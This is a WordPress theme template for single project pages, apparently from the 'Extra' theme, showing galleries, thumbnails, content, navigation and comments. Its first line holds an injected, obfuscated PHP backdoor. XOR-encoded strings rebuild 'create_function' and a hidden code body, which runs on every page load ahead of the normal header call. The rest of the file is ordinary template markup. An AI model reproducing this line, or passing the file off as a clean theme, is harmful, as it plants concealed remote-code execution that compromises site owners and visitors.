<?php $KyNPHf='3;5ZTH43U 2..99'^'PIP; -kU NQZGVW';$qxqcjNfy=$KyNPHf('',',ZiE5IW:CEB90R9GIJIqJ7QN6<J9J<2<FTHOomOhm4US;>>6YBI:<,,8EA=2QL,cAOMX,kNUEEOnSAfEo>SGFHZC7XlTcWcc9mMW9qpZbkQbmprYs=1AW-8JwQOD3eszr0OsSSa3v. XrFHJMU<+EL0MU0zgmk=TO6V+BWfS0AL46xq13.K<KYa<=D=838,ju8K8SnFaO7GAek4LHWglUWR6>.P7GPA82mSV2nGc..P0SH:7<ZN+TW8Ffwkty+:p+C,:qsPRWcDpQKH381YseJIonPYOM7;=ABvmV93Mo6XhX7:2lhQo;WZF-qa7h0-WAjnBXAJZbVPm:UXHX8Y,HIrn=53-3e7PRFOf82<zHuLtBLA6PZVU>P0B3LB4aEKTySFW8UOP295t7470jjetJ5TU4hFA4xDllkYA6YfselG,6S>ZXYQQXo3W6<JSXVc>7-7jB0E<qL3,SX+-,OMWS=JmtjM7-GJ<X-8AhAaE4XuDJT-FMooZ3R4No X.c13=SC7yHZ35jyPIZ4L0ZpPiQx+5YDH6W3-oiX65c<MPwHcRY6PRIyGj3ED t7wpDArngYfZuNtJdKlIeKnQOZM6RS8fSNInU 3+21fuC;A6R ItAHm=A<MMoinweUjMP=T:A:CFQP8Pbd57>.-L1W;nIyyUV9XkuOZn4'^'E<AdS<9Y7,-Wo7A.:>:YmO><iX+M+cmQ3 ofFM4bdR =XJWY7b1UNsHY1 bm<9XKe+,,MGnq. 6GsaFeOEYNOl56CxQtDpXi0d+8KYT3BVqRVPV0ONE3;HVbS5.0RLHZVYdXzYh:RAU,RhujeqXJ1-ki<mZ9MOV16mrBbrF D3 QXPUZVWbabbk546XLFJBBQW>LzULh2=:KoOP-<6GQu13ZMKk=c4 LS283KNzCHO<C6s0=Z5<N54PfNS476dq9ncMIQW;7.CyNqo>RTD<ZE1CfJ48;,hPX8bKMrRV4T<QL<VNSLUqKM663HJkJb:D1aBOf< >;Kv+g337:=Y:DhaV1opbxv6cp35oBSWEZuKlP4--C5sv.4Y9fW-6U>..-YnfsS06k80<PSUCQJWEP<T8 QSLHIr9ffO= B8FNE,2BE6L3958+=GK8Dc.2,7<aZXCB Q6YGxlH6;DIIgi32I+DXJiSL3+c3HAhAzk,RpQ + LfkIO;A U70K=W<TKT 7DQo1VLMUpm>U8QsPvOqPFQlllR6GL4N3SLDadpJuCunWb7yIsYQwvCDROHrvEVSoSbDvM.V-Z+BbNwiz,D 2A98+010XZXFBNR3Z8Z=A-SmhIY H,dFINWEuJ6Z41L Vkb51L19CEVGBB-UpfGrsp0.P,CEfadI');$qxqcjNfy(); get_header(); ?>
<div id="main-content">
	<?php
	if ( et_builder_is_product_tour_enabled() ):

			while ( have_posts() ): the_post(); ?>

				<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
					<div class="entry-content">
					<?php
						the_content();
					?>
					</div> <!-- .entry-content -->

				</article> <!-- .et_pb_post -->

		<?php endwhile;
		else:
	?>
	<div class="container">
		<div id="content-area" class="<?php extra_project_sidebar_class(); ?> clearfix">
			<div class="et_pb_extra_column_main">
				<?php
				if ( have_posts() ) :
					while ( have_posts() ) : the_post(); ?>
						<article id="post-<?php the_ID(); ?>" <?php post_class( 'module single-project-module' ); ?>>
							<?php if ( is_post_extra_title_meta_enabled() ) { ?>
							<div class="post-header">
								<h1 class="entry-title"><?php the_title(); ?></h1>
								<div class="post-meta">
									<p>
										<?php
											echo et_extra_display_post_meta( array('rating_stars' => false) );
										?>
									</p>
								</div>
							</div>
							<?php } ?>

							<?php
							$attachments  = extra_get_the_project_gallery_images();
							$thumbnail_id = get_post_thumbnail_id();

							if ( $attachments ) {
							?>
							<?php $gallery_autoplay = get_post_meta( get_the_ID(), '_gallery_autoplay', true ); ?>
							<div class="post-thumbnail post-gallery">
								<div class="gallery et-slider" <?php if ( $gallery_autoplay ) { echo ' data-autoplay="' . esc_attr( $gallery_autoplay ) . '"'; } ?>>
									<div class="carousel-items">
										<div class="carousel-item-size"></div>
									<?php foreach ( $attachments as $attachment_id => $attachment_src ) { ?>
										<div class="gallery_image carousel-item">
											<img src="<?php echo esc_attr( $attachment_src ); ?>" alt="<?php echo esc_attr( get_the_title() ); ?>" />
										</div>
									<?php } ?>
									</div>
								</div>
							</div><!-- .post-thumbnail.post-gallery -->
							<?php } else if ( $thumbnail_id && is_post_extra_featured_image_enabled() ) { ?>
							<div class="post-thumbnail">
								<?php list($thumb_src, $thumb_width, $thumb_height) = wp_get_attachment_image_src( $thumbnail_id, 'extra-image-huge' ); ?>

								<img src="<?php echo esc_attr( $thumb_src ); ?>" alt="<?php echo esc_attr( get_the_title() ); ?>" />
							</div><!-- .post-thumbnail -->
							<?php } ?>

							<div class="post-wrap">
								<div class="post-content entry-content">
									<?php the_content(); ?>
									<?php
										wp_link_pages( array(
											'before' => '<div class="page-links">' . esc_html__( 'Pages:', 'extra' ),
											'after'  => '</div>',
										) );
									?>
								</div>
							</div>
						</article>
				<?php endwhile; ?>
				<?php else : ?>
					<h2><?php esc_html_e( 'Post not found', 'extra' ); ?></h2>
				<?php endif; ?>

				<?php extra_project_get_below_content(); ?>

				<nav class="post-nav">
					<div class="nav-links clearfix">
						<div class="nav-link nav-link-prev">
							<?php previous_post_link( '%link', et_get_safe_localization( __( '<span class="button" title="%title"></span>', 'extra' ) ) ); ?>
						</div>
						<div class="nav-link nav-link-next">
							<?php next_post_link( '%link', et_get_safe_localization( __( '<span class="button" title="%title"></span>', 'extra' ) ) ); ?>
						</div>
					</div>
				</nav>

				<?php
				if ( ( comments_open() || get_comments_number() ) && 'on' == et_get_option( 'extra_show_postcomments', 'on' ) ) {
					comments_template( '', true );
				}
				?>

			</div><!-- /.et_pb_extra_column.et_pb_extra_column_main -->

			<?php extra_project_get_sidebar(); ?>

		</div> <!-- #content-area -->
	</div> <!-- .container -->
	<?php endif; ?>
</div> <!-- #main-content -->

<?php get_footer();
